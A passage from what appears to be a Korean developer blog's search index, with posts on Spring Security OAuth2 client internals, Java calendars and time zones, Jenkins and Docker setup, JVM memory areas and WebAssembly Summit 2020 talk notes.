Assert.hasText(registrationId, \"registrationId cannot be empty\"); return this.registrations.get(registrationId); &#125;&#125; Default 구현체는 InMemoryClientRegistrationRepository 이다. Map으로 ClientRegistration 들을 가지고 있으며, 해당 registrationId 로 ClientRegistration을 찾을수 있는 기능을 제공한다. Spring boot 2.x auto-configuration은 spring.security.oauth2.client.registration.[registrationId] 의 형태로 바인드를 자동으로 해놓는다. 또한 ClientRegistrationRepository라는 이름으로 Bean 등록을 해놓았기 때문에 Inject 받아서 사용가능하다. OAuthAuthorizedClient Authorized Client를 표현한다. Authorized Client는 보호되는 자원에 대한 Access 권한을 받은 것으로 간주된다. Oauth2AuthorizedClient 는 ClientRegistration과 Resource Owner(End-user) 간 OAuth2AccessToken, OAuth2RefreshToken을 연결시켜준다. 1234567public class OAuth2AuthorizedClient implements Serializable &#123; private static final long serialVersionUID = SpringSecurityCoreVersion.SERIAL_VERSION_UID; private final ClientRegistration clientRegistration; private final String principalName; private final OAuth2AccessToken accessToken; private final OAuth2RefreshToken refreshToken;&#125; OAuth2AuthorizedClientRepository 12345678910111213141516171819202122232425262728293031323334353637383940public final class AuthenticatedPrincipalOAuth2AuthorizedClientRepository implements OAuth2AuthorizedClientRepository &#123; private final AuthenticationTrustResolver authenticationTrustResolver = new AuthenticationTrustResolverImpl(); private final OAuth2AuthorizedClientService authorizedClientService; private OAuth2AuthorizedClientRepository anonymousAuthorizedClientRepository = new HttpSessionOAuth2AuthorizedClientRepository(); @Override public &lt;T extends OAuth2AuthorizedClient&gt; T loadAuthorizedClient(String clientRegistrationId, Authentication principal, HttpServletRequest request) &#123; if (this.isPrincipalAuthenticated(principal)) &#123; return this.authorizedClientService.loadAuthorizedClient(clientRegistrationId, principal.getName()); &#125; else &#123; return this.anonymousAuthorizedClientRepository.loadAuthorizedClient(clientRegistrationId, principal, request); &#125; &#125; @Override public void saveAuthorizedClient(OAuth2AuthorizedClient authorizedClient, Authentication principal, HttpServletRequest request, HttpServletResponse response) &#123; if (this.isPrincipalAuthenticated(principal)) &#123; this.authorizedClientService.saveAuthorizedClient(authorizedClient, principal); &#125; else &#123; this.anonymousAuthorizedClientRepository.saveAuthorizedClient(authorizedClient, principal, request, response); &#125; &#125; @Override public void removeAuthorizedClient(String clientRegistrationId, Authentication principal, HttpServletRequest request, HttpServletResponse response) &#123; if (this.isPrincipalAuthenticated(principal)) &#123; this.authorizedClientService.removeAuthorizedClient(clientRegistrationId, principal.getName()); &#125; else &#123; this.anonymousAuthorizedClientRepository.removeAuthorizedClient(clientRegistrationId, principal, request, response); &#125; &#125; private boolean isPrincipalAuthenticated(Authentication authentication) &#123; return authentication != null &amp;&amp; !this.authenticationTrustResolver.isAnonymous(authentication) &amp;&amp; authentication.isAuthenticated(); &#125;&#125; AuthenticationTrustResolver에 질의해 인증된 사용자라면 service에 요청하고 아니면 anonymousAuthorizedClientRepository에 요청한다. OAuth2AuthorizationCodeAuthenticationToken으로 인증을 진행한다. Session Attribute Name = org.springframework.security.oauth2.client.web.HttpSessionOAuth2AuthorizedClientRepository.AUTHORIZED_CLIENTS 내부에 anonymousAuthorizedClientRepository로 HttpSessionOAuth2AuthorizedClientRepository을 가지고 있다. 해당 Session Attribute Name으로 AuthorizedClient들을 저장하고 있다. AuthenticationTrustResolver 123456789101112131415161718192021222324252627282930313233343536public class AuthenticationTrustResolverImpl implements AuthenticationTrustResolver &#123; private Class&lt;? extends Authentication&gt; anonymousClass = AnonymousAuthenticationToken.class; private Class&lt;? extends Authentication&gt; rememberMeClass = RememberMeAuthenticationToken.class; Class&lt;? extends Authentication&gt; getAnonymousClass() &#123; return anonymousClass; &#125; Class&lt;? extends Authentication&gt; getRememberMeClass() &#123; return rememberMeClass; &#125; public boolean isAnonymous(Authentication authentication) &#123; if ((anonymousClass == null) || (authentication == null)) &#123; return false; &#125; return anonymousClass.isAssignableFrom(authentication.getClass()); &#125; public boolean isRememberMe(Authentication authentication) &#123; if ((rememberMeClass == null) || (authentication == null)) &#123; return false; &#125; return rememberMeClass.isAssignableFrom(authentication.getClass()); &#125; public void setAnonymousClass(Class&lt;? extends Authentication&gt; anonymousClass) &#123; this.anonymousClass = anonymousClass; &#125; public void setRememberMeClass(Class&lt;? extends Authentication&gt; rememberMeClass) &#123; this.rememberMeClass = rememberMeClass; &#125;&#125; Anonymous, RememberMe 를 구현하고 할당이 가능한지에 따라 True, False를 반환한다. OAuth2AuthorizedClientService 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748public final class InMemoryOAuth2AuthorizedClientService implements OAuth2AuthorizedClientService &#123; private final Map&lt;OAuth2AuthorizedClientId, OAuth2AuthorizedClient&gt; authorizedClients; private final ClientRegistrationRepository clientRegistrationRepository; public InMemoryOAuth2AuthorizedClientService(ClientRegistrationRepository clientRegistrationRepository) &#123; Assert.notNull(clientRegistrationRepository, \"clientRegistrationRepository cannot be null\"); this.clientRegistrationRepository = clientRegistrationRepository; this.authorizedClients = new ConcurrentHashMap&lt;&gt;(); &#125; public InMemoryOAuth2AuthorizedClientService(ClientRegistrationRepository clientRegistrationRepository, Map&lt;OAuth2AuthorizedClientId, OAuth2AuthorizedClient&gt; authorizedClients) &#123; Assert.notNull(clientRegistrationRepository, \"clientRegistrationRepository cannot be null\"); Assert.notEmpty(authorizedClients, \"authorizedClients cannot be empty\"); this.clientRegistrationRepository = clientRegistrationRepository; this.authorizedClients = new ConcurrentHashMap&lt;&gt;(authorizedClients); &#125; @Override @SuppressWarnings(\"unchecked\") public &lt;T extends OAuth2AuthorizedClient&gt; T loadAuthorizedClient(String clientRegistrationId, String principalName) &#123; Assert.hasText(clientRegistrationId, \"clientRegistrationId cannot be empty\"); Assert.hasText(principalName, \"principalName cannot be empty\"); ClientRegistration registration = this.clientRegistrationRepository.findByRegistrationId(clientRegistrationId); if (registration == null) &#123; return null; &#125; return (T) this.authorizedClients.get(new OAuth2AuthorizedClientId(clientRegistrationId, principalName)); &#125; @Override public void saveAuthorizedClient(OAuth2AuthorizedClient authorizedClient, Authentication principal) &#123; Assert.notNull(authorizedClient, \"authorizedClient cannot be null\"); Assert.notNull(principal, \"principal cannot be null\"); this.authorizedClients.put(new OAuth2AuthorizedClientId(authorizedClient.getClientRegistration().getRegistrationId(), principal.getName()), authorizedClient); &#125; @Override public void removeAuthorizedClient(String clientRegistrationId, String principalName) &#123; Assert.hasText(clientRegistrationId, \"clientRegistrationId cannot be empty\"); Assert.hasText(principalName, \"principalName cannot be empty\"); ClientRegistration registration = this.clientRegistrationRepository.findByRegistrationId(clientRegistrationId); if (registration != null) &#123; this.authorizedClients.remove(new OAuth2AuthorizedClientId(clientRegistrationId, principalName)); &#125; &#125;&#125; ClientRegistrationRepository를 가지고 있고, 해당 Repository에 CRUD를 하는 기능들을 가지고 있다. Bean으로 선언되어 있어 Application레벨에서 사용이 용이하게 되어있다. OAuth2AuthorizedClientManager 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758public final class DefaultOAuth2AuthorizedClientManager implements OAuth2AuthorizedClientManager &#123; private final ClientRegistrationRepository clientRegistrationRepository; private final OAuth2AuthorizedClientRepository authorizedClientRepository; private OAuth2AuthorizedClientProvider authorizedClientProvider = context -&gt; null; private Function&lt;OAuth2AuthorizeRequest, Map&lt;String, Object&gt;&gt; contextAttributesMapper = new DefaultContextAttributesMapper(); @Nullable @Override public OAuth2AuthorizedClient authorize(OAuth2AuthorizeRequest authorizeRequest) &#123; Assert.notNull(authorizeRequest, \"authorizeRequest cannot be null\"); String clientRegistrationId = authorizeRequest.getClientRegistrationId(); OAuth2AuthorizedClient authorizedClient = authorizeRequest.getAuthorizedClient(); Authentication principal = authorizeRequest.getPrincipal(); HttpServletRequest servletRequest = getHttpServletRequestOrDefault(authorizeRequest.getAttributes()); Assert.notNull(servletRequest, \"servletRequest cannot be null\"); HttpServletResponse servletResponse = getHttpServletResponseOrDefault(authorizeRequest.getAttributes()); Assert.notNull(servletResponse, \"servletResponse cannot be null\"); OAuth2AuthorizationContext.Builder contextBuilder; if (authorizedClient != null) &#123; contextBuilder = OAuth2AuthorizationContext.withAuthorizedClient(authorizedClient); &#125; else &#123; ClientRegistration clientRegistration = this.clientRegistrationRepository.findByRegistrationId(clientRegistrationId); Assert.notNull(clientRegistration, \"Could not find ClientRegistration with id '\" + clientRegistrationId + \"'\"); authorizedClient = this.authorizedClientRepository.loadAuthorizedClient( clientRegistrationId, principal, servletRequest); if (authorizedClient != null) &#123; contextBuilder = OAuth2AuthorizationContext.withAuthorizedClient(authorizedClient); &#125; else &#123; contextBuilder = OAuth2AuthorizationContext.withClientRegistration(clientRegistration); &#125; &#125; OAuth2AuthorizationContext authorizationContext = contextBuilder .principal(principal) .attributes(attributes -&gt; &#123; Map&lt;String, Object&gt; contextAttributes = this.contextAttributesMapper.apply(authorizeRequest); if (!CollectionUtils.isEmpty(contextAttributes)) &#123; attributes.putAll(contextAttributes); &#125; &#125;) .build(); authorizedClient = this.authorizedClientProvider.authorize(authorizationContext); if (authorizedClient != null) &#123; this.authorizedClientRepository.saveAuthorizedClient(authorizedClient, principal, servletRequest, servletResponse); &#125; else &#123; // In the case of re-authorization, the returned `authorizedClient` may be null if re-authorization is not supported. // For these cases, return the provided `authorizationContext.authorizedClient`. if (authorizationContext.getAuthorizedClient() != null) &#123; return authorizationContext.getAuthorizedClient(); &#125; &#125; return authorizedClient; &#125;&#125; 내부에 ClientRegistrationRepository로는 InMemoryClientRegistrationRepository를 가지고 있다. 내부에 AuthorizedClientRepository로 AuthenticatedPrincipalOAuth2AuthorizedClientRepository를 가지고 있다. 내부에 AuthenticationProvider로 DelegatingOAuth2AuthorizedClientProvider를 가지고 있다. DelegatingOAuth2AuthorizedClientProvider는 Config에서 선언한 GrantType에 해당하는 Provider들을 전부 가지고 있다. The DefaultOAuth2AuthorizedClientManager is designed to be used within the context of a HttpServletRequest. When operating outside of a HttpServletRequest context, use AuthorizedClientServiceOAuth2AuthorizedClientManager instead. OAuth2AuthorizedClientProvider 각 GrantType에 따른 인증 방식이 들어있다. 인증을 하는 조건이 맞지 않으면 Throw Exception을 던진다. OAuth2AuthorizationRequestRedirectFilter 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109public class OAuth2AuthorizationRequestRedirectFilter extends OncePerRequestFilter &#123; public static final String DEFAULT_AUTHORIZATION_REQUEST_BASE_URI = \"/oauth2/authorization\"; private final ThrowableAnalyzer throwableAnalyzer = new DefaultThrowableAnalyzer(); private final RedirectStrategy authorizationRedirectStrategy = new DefaultRedirectStrategy(); private OAuth2AuthorizationRequestResolver authorizationRequestResolver; private AuthorizationRequestRepository&lt;OAuth2AuthorizationRequest&gt; authorizationRequestRepository = new HttpSessionOAuth2AuthorizationRequestRepository(); private RequestCache requestCache = new HttpSessionRequestCache(); public OAuth2AuthorizationRequestRedirectFilter(ClientRegistrationRepository clientRegistrationRepository) &#123; this(clientRegistrationRepository, DEFAULT_AUTHORIZATION_REQUEST_BASE_URI); &#125; public OAuth2AuthorizationRequestRedirectFilter(ClientRegistrationRepository clientRegistrationRepository, String authorizationRequestBaseUri) &#123; Assert.notNull(clientRegistrationRepository, \"clientRegistrationRepository cannot be null\"); Assert.hasText(authorizationRequestBaseUri, \"authorizationRequestBaseUri cannot be empty\"); this.authorizationRequestResolver = new DefaultOAuth2AuthorizationRequestResolver( clientRegistrationRepository, authorizationRequestBaseUri); &#125; public OAuth2AuthorizationRequestRedirectFilter(OAuth2AuthorizationRequestResolver authorizationRequestResolver) &#123; Assert.notNull(authorizationRequestResolver, \"authorizationRequestResolver cannot be null\"); this.authorizationRequestResolver = authorizationRequestResolver; &#125; public final void setAuthorizationRequestRepository(AuthorizationRequestRepository&lt;OAuth2AuthorizationRequest&gt; authorizationRequestRepository) &#123; Assert.notNull(authorizationRequestRepository, \"authorizationRequestRepository cannot be null\"); this.authorizationRequestRepository = authorizationRequestRepository; &#125; public final void setRequestCache(RequestCache requestCache) &#123; Assert.notNull(requestCache, \"requestCache cannot be null\"); this.requestCache = requestCache; &#125; @Override protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain) throws ServletException, IOException &#123; try &#123; OAuth2AuthorizationRequest authorizationRequest = this.authorizationRequestResolver.resolve(request); if (authorizationRequest != null) &#123; this.sendRedirectForAuthorization(request, response, authorizationRequest); return; &#125; &#125; catch (Exception failed) &#123; this.unsuccessfulRedirectForAuthorization(request, response, failed); return; &#125; try &#123; filterChain.doFilter(request, response); &#125; catch (IOException ex) &#123; throw ex; &#125; catch (Exception ex) &#123; // Check to see if we need to handle ClientAuthorizationRequiredException Throwable[] causeChain = this.throwableAnalyzer.determineCauseChain(ex); ClientAuthorizationRequiredException authzEx = (ClientAuthorizationRequiredException) this.throwableAnalyzer .getFirstThrowableOfType(ClientAuthorizationRequiredException.class, causeChain); if (authzEx != null) &#123; try &#123; OAuth2AuthorizationRequest authorizationRequest = this.authorizationRequestResolver.resolve(request, authzEx.getClientRegistrationId()); if (authorizationRequest == null) &#123; throw authzEx; &#125; this.sendRedirectForAuthorization(request, response, authorizationRequest); this.requestCache.saveRequest(request, response); &#125; catch (Exception failed) &#123; this.unsuccessfulRedirectForAuthorization(request, response, failed); &#125; return; &#125; if (ex instanceof ServletException) &#123; throw (ServletException) ex; &#125; else if (ex instanceof RuntimeException) &#123; throw (RuntimeException) ex; &#125; else &#123; throw new RuntimeException(ex); &#125; &#125; &#125; private void sendRedirectForAuthorization(HttpServletRequest request, HttpServletResponse response, OAuth2AuthorizationRequest authorizationRequest) throws IOException &#123; if (AuthorizationGrantType.AUTHORIZATION_CODE.equals(authorizationRequest.getGrantType())) &#123; this.authorizationRequestRepository.saveAuthorizationRequest(authorizationRequest, request, response); &#125; this.authorizationRedirectStrategy.sendRedirect(request, response, authorizationRequest.getAuthorizationRequestUri()); &#125; private void unsuccessfulRedirectForAuthorization(HttpServletRequest request, HttpServletResponse response, Exception failed) throws IOException &#123; if (logger.isErrorEnabled()) &#123; logger.error(\"Authorization Request failed: \" + failed.toString(), failed); &#125; response.sendError(HttpStatus.INTERNAL_SERVER_ERROR.value(), HttpStatus.INTERNAL_SERVER_ERROR.getReasonPhrase()); &#125; private static final class DefaultThrowableAnalyzer extends ThrowableAnalyzer &#123; protected void initExtractorMap() &#123; super.initExtractorMap(); registerExtractor(ServletException.class, throwable -&gt; &#123; ThrowableAnalyzer.verifyThrowableHierarchy(throwable, ServletException.class); return ((ServletException) throwable).getRootCause(); &#125;); &#125; &#125;&#125; OAuth2AuthorizationCodeGrantFilter 123456789101112131415161718190. WebAsyncManagerIntegrationFilter 1. SecurityContextPersistenceFilter@6814 2. HeaderWriterFilter3. CsrfFilter4. LogoutFilter 5. OAuth2AuthorizationRequestRedirectFilter 6. UsernamePasswordAuthenticationFilter 7. RequestCacheAwareFilter 8. SecurityContextHolderAwareRequestFilter 9. AnonymousAuthenticationFilter 10. OAuth2AuthorizationCodeGrantFilter 11. SessionManagementFilter 12. ExceptionTranslationFilter 13. FilterSecurityInterceptor authorizationRedirectStrategy : DefaultRedirectStrategy DefaultOauth2AuthorizationRequestResolver","categories":[],"tags":[]},{"title":"java-map-marker","slug":"java-map-marker","date":"2020-03-26T04:13:37.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2020/03/26/java-map-marker/","link":"","permalink":"https://blog.devkwang.app/2020/03/26/java-map-marker/","excerpt":"","text":"Map Spatial DB OGC POI (Point of Interesting)","categories":[],"tags":[]},{"title":"java-calendar-locale-timezone","slug":"java-calendar-locale-timezone","date":"2020-03-16T09:19:33.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2020/03/16/java-calendar-locale-timezone/","link":"","permalink":"https://blog.devkwang.app/2020/03/16/java-calendar-locale-timezone/","excerpt":"","text":"Java Date &amp; Calendar Locale Extension : buddhist, japanese, gregory 형태의 달력 선택 가능 BuddhistCalendar (불멸기원 : 석가모니가 입멸한 해를 기준으로 삼는 연대 표기) JapaneseImperialCalendar (일본 연호 : 일본에서는 새 천황이 즉위하거나 나라에 자연재해가 계속될 때 연호를 바꾼다. ) 123456public static final int BEFORE_MEIJI = 0;public static final int MEIJI = 1; (1868년 ~ 1912년)public static final int TAISHO = 2; public static final int SHOWA = 3;public static final int HEISEI = 4;private static final int REIWA = 5; GregorianCalendar 율리우스력의 바탕이 된 이집트력을 기본으로 하고 1년의 길이를 365.2425일로 정하는 역법체계. 윤년을 포함하는 양력을 말한다. 율리우스력의 오차를 수정한 달력이며, 기본 구조는 율리우스력을 그대로 따르되 윤년을 정하는 규칙을 추가했다. Java Locale A Locale object represents a specific geographical, political, or cultural region. Language, Script, Country Country Code &amp; Language Code Language Code Script Code Country 한국어 ko Kore KR 일본어 ja JP 영어 en US Locale 은 Display 속성과 Format 속성을 따로 관리한다. Display 속성은 언어를 표현하는 단어를 어울러서 가지고 있다. Format 속성은 Locale 에 해당하는 숫자, 연도 포멧을 가지고 있다. Java TimeZone GMT(Greenwich Mean Time) 그리니치 천문대를 기준으로 하는 평균 태양시 UTC(universal time coordinated) 세슘 원자의 진동수에 기반한 것으로 오차가 30만년에 1초 수준 UTC vs GMT 초의 소수점 차이만 난다. ms 이하의 값들이 중요하다면 UTC를 쓰고 아니면 GMT를 써도 무방 타국 타임존 UTC, GMT(세계 표준시 ) : 한국시간에 9시간을 빼어 계산한다. CEST(중부 유럽 서머타임) : UTC+2 hours , 한국시간에 7시간을 빼어 계산한다. BST(영국 서머타임) : UTC+1 hour , 한국시간에 8시간을 빼어 계산한다. EDT(미국동부 서머타임, 예:뉴욕) : UTC-4 hours , 한국시간에 13시간을 빼어 계산한다. CDT(미국중부 서머타임, 예:시카고) : UTC-5 hours , 한국시간에 14시간을 빼어 계산한다. CST(중국표준시, 예:타이페이) : UTC+8 hours , 한국시간에 1시간을 빼어 계산한다. 유닉스 시간 (POSIX, Epoch) UTC 1970년 1월 1일 00:00:00 부터 경과 시간을 초로 환산하여 정수로 나타낸 것","categories":[{"name":"Date","slug":"Date","permalink":"https://blog.devkwang.app/categories/Date/"},{"name":"Calendar","slug":"Date/Calendar","permalink":"https://blog.devkwang.app/categories/Date/Calendar/"}],"tags":[{"name":"java","slug":"java","permalink":"https://blog.devkwang.app/tags/java/"}]},{"title":"spring-util-reflection","slug":"spring-util-reflection","date":"2020-03-12T04:31:47.000Z","updated":"2022-01-28T01:25:12.427Z","comments":true,"path":"2020/03/12/spring-util-reflection/","link":"","permalink":"https://blog.devkwang.app/2020/03/12/spring-util-reflection/","excerpt":"","text":"12","categories":[],"tags":[]},{"title":"project-start-materials","slug":"project-start-materials","date":"2020-03-01T11:26:59.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2020/03/01/project-start-materials/","link":"","permalink":"https://blog.devkwang.app/2020/03/01/project-start-materials/","excerpt":"","text":"Jenkins CI/CD 환경을 만들기 위해서 가장 익숙한 도구를 사용했다. war파일을 받아 실행만 하면 매우 쉽기 때문에 설치해서 사용하려고 한다. script123456#!/bin/bashexport HTTP_PORT=9090export JENKINS_HOME=~/project/jenkins/jenkins_homenohup java -jar jenkins.war --httpPort=$HTTP_PORT --sessionTimeout=120 -XX:+AggressiveOpts &gt;&gt; ./logs/jenkins.log 2&gt;&amp;1 &amp; 아무 설정도 하지 않으면 JENKINS_HOME을 기본적으로 홈의 .jenkins 폴더에 구성하기 떄문에 Jenkins_home을 지정해주고, Port 설정을 하지 않으면 8080 포트로 기동 되기에 HTTP_PORT 를 변경할 수 있도록 한다. 그리고 기동 후 $JENKINS_HOME/secrets/initialAdminPassword 를 물어보기 때문에 이를 넣고 기동하도록 하자 Docker Docker를 이용한 Container 배포를 하기 위해 로컬에서 Docker를 사용할 수 있도록 설치 해보자 https://docs.docker.com/install/linux/docker-ce/ubuntu/ 에 매우 잘 나와 있다. SET UP THE REPOSITORY update the apt package index: script1sudo apt update Install packages to allow apt to use a repository over HTTPS: script123456sudo apt install \\ apt-transport-https \\ ca-certificates \\ curl \\ gnupg-agent \\ software-properties-common Add Docker’s official GPG key: GPG(PGP)는 암호화 프로그램으로 RSA 방식을 사용하며 주로 이메일을 암호화 하는데 사용된다. script123curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -sudo apt-key fingerprint 0EBFCD88 Set up the stable repository lsb_release -cs 는 Ubuntu distribution 정보를 알수 있다. Eoan 19.10 Bionic 18.04 (LTS) Xenial 16.04 (LTS) script1sudo add-apt-repository \"deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable\" INSTALL DOCKER ENGINE - COMMUNITY Update the apt package index. script1sudo apt update Install the latest version of Docker Engine - Community and containerd, or go to the next step to install a specific version: script123456sudo apt install docker-ce docker-ce-cli containerd.io``` 3. Verify that Docker Engine```shell scriptsudo docker run hello-world 확인 script1234567891011121314151617181920212223242526Unable to find image 'hello-world:latest' locallylatest: Pulling from library/hello-world1b930d010525: Pull complete Digest: sha256:fc6a51919cfeb2e6763f62b6d9e8815acbf7cd2e476ea353743570610737b752Status: Downloaded newer image for hello-world:latestHello from Docker!This message shows that your installation appears to be working correctly.To generate this message, Docker took the following steps: 1. The Docker client contacted the Docker daemon. 2. The Docker daemon pulled the \"hello-world\" image from the Docker Hub. (amd64) 3. The Docker daemon created a new container from that image which runs the executable that produces the output you are currently reading. 4. The Docker daemon streamed that output to the Docker client, which sent it to your terminal.To try something more ambitious, you can run an Ubuntu container with: $ docker run -it ubuntu bashShare images, automate workflows, and more with a free Docker ID: https://hub.docker.com/For more examples and ideas, visit: https://docs.docker.com/get-started/","categories":[],"tags":[]},{"title":"java-fundamental-method-area","slug":"java-fundamental-method-area","date":"2020-02-27T02:52:51.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2020/02/27/java-fundamental-method-area/","link":"","permalink":"https://blog.devkwang.app/2020/02/27/java-fundamental-method-area/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"java-fundamental-runtime-data-areas","slug":"java-fundamental-runtime-data-areas","date":"2020-02-27T02:40:06.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2020/02/27/java-fundamental-runtime-data-areas/","link":"","permalink":"https://blog.devkwang.app/2020/02/27/java-fundamental-runtime-data-areas/","excerpt":"","text":"Runtime Data Areas PC Registers CPU에서 명령어(Instruction)을 수행하는 과정에서 필요한 정보를 레지스터(Register)라고 하는 CPU내 기억장치를 사용한다. Java의 PC Registers는 Register-Base로 구동되는 방식이 아니라 Stack-Base로 작동한다. JVM은 CPU에 직접 명령어를 수행하지 않고 Stack에서 Operand를 뽑아내 이를 별도의 메모리 공간에 저장하는 방식을 취하고 있다. 플랫폼 독립적인 설계를 위해 버퍼공간으로 만든 메모리 공간을 PC Registers라고 한다. Java Virtual Machine Stacks Thread의 수행 정보를 기록하는 Frame을 저장하는 공간 Thread별로 하나씩 존재하며 Thread가 시작할 때 생성된다. Stack Frame 이라고 하는 것들로 구성이 되는데 JVM은 Stack Frame을 push,pop 작업만 수행한다. 그래서 이 Stack Frame들의 정보를 Stack Trace또는 Stack Dump를 얻어내어 분석을 하게 된다. 현재 수행하고 있는 Method의 Strack Frame을 Current Frame이라고 한다. 현재 수행하고 있는 Method의 Class를 Current Class이라고 한다. Method Area 메모리 영역들이 각 Thread마다 할당되는 배타적인 공간인데 반해 Method Area는 모든 thread들이 공유하는 메모리 영역이다. Load된 Type(Class, Interface)을 저장하는 논리적 메모리 공간 Type의 ByteCode 뿐만 아니라, 모든 변수, 상수, Reference, Method Data등이 포함된다. Class Variable과 Method와 생성자의 정보도 포함된다. 이 정보들은 ClassLoader에게 넘겨받은 Class File에서 Type관련 정보를 추출하여 저장하게 된다. Method Area는 JVM이 기동할때 생성이 되고 GC대상이며, 이는 벤더마다 구현이 다르다.","categories":[],"tags":[]},{"title":"java-fundamental-method-stack","slug":"java-fundamental-method-stack","date":"2020-02-27T02:23:55.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2020/02/27/java-fundamental-method-stack/","link":"","permalink":"https://blog.devkwang.app/2020/02/27/java-fundamental-method-stack/","excerpt":"","text":"Java Virtual Machine Stacks Local Variable Section Method Parameters음 float size 1 long, double size 2 char, byte, boolean, short, int 전체가 int형으로 선언되어 있음 Local variable Operand Stack Work Space in JVM JVM 작업 공간, JVM 이 프로그램을 수행하면서 연산을 위해 사용되는 데이터 및 결과를 Operand Stack에 집어넣고 처리함 Frame Data Constant pool Resolution Normal Method Return Exception Dispatch Native Method Stacks Native Code C ==&gt; C Stack Native Code C++ ==&gt; C++ Stack","categories":[],"tags":[]},{"title":"WebAssembly-summit-2020","slug":"WebAssembly-summit-2020","date":"2020-02-23T07:42:19.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2020/02/23/WebAssembly-summit-2020/","link":"","permalink":"https://blog.devkwang.app/2020/02/23/WebAssembly-summit-2020/","excerpt":"","text":"Building a new kind of ecosystem https://webassembly-summit.org/speakers/1/ 보안을 강화하기 위한 Web Assembly Sandboxing Memory model Memory isolation Interface Types exchange high-level values between memories we can isolate the memory between modules without making it too hard to share data WebAssembly System Interface we actually have the concept of permissions baked into them we can give different modules, different permissions to different resource. WebAssembly nano process protect from malicious code vulnerable code Shipping Tiny Web Assembly https://webassembly-summit.org/speakers/2/ Sometimes code size is negligible(무시할만한) compared to other factors like asset size Sometimes the magic ability to run an app on the web at all is worth a large code size (ship a framework, VM, etc) WebAssembly : An opportunity for Small Code! binary format dead code elimination is possible Advice For All ToolChains 1 slide of obvious stuff Enable compression on the server! Minify your Javascript too! Run Binaryen’s wasm-opt What It Does (wasm-opt) Dead code elimination constant propagation Inlining Local optimizations (CoalesceLocals, SimplifyLocals, etc) memory segment optimization (MemoryPacking) Structured control flow (ReReloop, RemoveUnusedBrs) etc Advice for specific Languages &amp; Toolchains General C/C++ If you don’t use c++ exceptions, build with -fno-exceptions avoid RTTI if you don’t need it, build with -fno-rtti Careful with templates virtual calls may inhibit DCE prefer simple C over C++ standard library Use WEB APIs directly Even better than printf, call a Web API, e.g. using EM_JS: JavaScriptCore’s new WebAssembly interpreter https://webassembly-summit.org/speakers/4/ WebAssembly BBQ : View Bytecode Quickly (less optimize) OMG : Optimize Machine code Generator (full optimize) https://webkit.org/blog/9329/ WebAssembly Music https://webassembly-summit.org/speakers/5/ Introduction WebAssembly deliver performance for rendering realtime audio Low latency possible with AudioWorklet Let’s create a synthesizer and sequencer in WebAssembly Background Warning Experimenting with synthesizers can produce sudden unexpected very loud noise, witch may damage your hearing Keep the volume low, especially if using headphones Make sure you now where the mute button is 😃 The Basics The simplest instrument Add to the mix App map sequencer (same as in 4klang) A simple pattern sequencer Short fixed length patterns 1234[[0, 0, 0, 0, 0, 0, 0, 0],[64, 0, 65, 0, 0, 67, 64, 0],[22, 23, 34, 34, 34, 0, 44, 45],[22, 33, 0, 0, 34, 0, 44, 55]] Track for each instrument with a list of patterns to play 123[[0, 1, 0, 2],[1, 1, 3, 3],[0, 0, 1, 2]] This is all it takes ato orchestrate the instruments Generate sequencer data from code Record MIDI and generate code While playing, midi input data is stored to patterns If we want to use the recording, we can paste it as code Pattern data is “reverse engineered” to javascript code, with durations on the notes instead of repeated hold commands AssemblyScript (why did I choose it?) High level readability Low level control Pure WebAssembly output (no additional js lib) Builds optimized for speed and size (Binaryen) Create WEbAssembly binaries in the browser Great for live coding: rapid development, instant results, directly in the browser! Synthesizing instruments in AssemblyScript No sample data, just in code Data driven or code driven? Envelope -&gt; oscillator -&gt; filter -&gt; out You can synthesize an instrument by connecting envelopes, oscillators, filters etc. Typical to create a data structure to be interpreted at runtime. With AssemblyScript/WebAssembly we can instead generate and compile the code in the browser Just like modern web-frameworks resolving configuration at compile-time (such as language) Out binary can contain the logic directly rather than an interpreter of data describing the logic Faster and smaller builds, no interpreter overhead Not just for synthesizers but also for e.g smart contracts Compiling is cheap, make pre-configured binaries rather than configuring at runtime. AudioWorklet The “proper” way of using AudioWorklet would be to have one node per instrument and let WebAudio do the orchestration/mixing But then we couldn’t have music produced by a single WebAssembly executable binary Made a polyfill for the purpose of serving this app AudioWorklet model of render audio callback for WASI(Web Assembly System Interface)? (Similar to Jack and Core Audio) Sources on github https://github.com/petersalomonsen/javascriptmusic project contains the WebAssembly music experiment, and also the predecessing javascript music projects for Midi synths and 4klang.","categories":[],"tags":[]},{"title":"java-stream-function-interface","slug":"java-stream-function-interface","date":"2020-02-19T12:41:18.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2020/02/19/java-stream-function-interface/","link":"","permalink":"https://blog.devkwang.app/2020/02/19/java-stream-function-interface/","excerpt":"","text":"함수형 인터페이스 Descriptor Method명 Predicate T -&gt; boolean test() Consumer T -&gt; void accept() Supplier () -&gt; T accept() Function&lt;T,R&gt; T -&gt; R apply() UnaryOperator T -&gt; T identity()","categories":[],"tags":[]},{"title":"java-poi","slug":"java-poi","date":"2020-02-19T12:28:41.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2020/02/19/java-poi/","link":"","permalink":"https://blog.devkwang.app/2020/02/19/java-poi/","excerpt":"","text":"확인해보 https://blog.naver.com/tmondev/221388780914 https://blog.miyam.net/41 https://www.codejava.net/coding/java-code-example-to-export-data-from-database-to-excel-file http://jexcelapi.sourceforge.net/resources/faq/ https://offbyone.tistory.com/70 flyweight 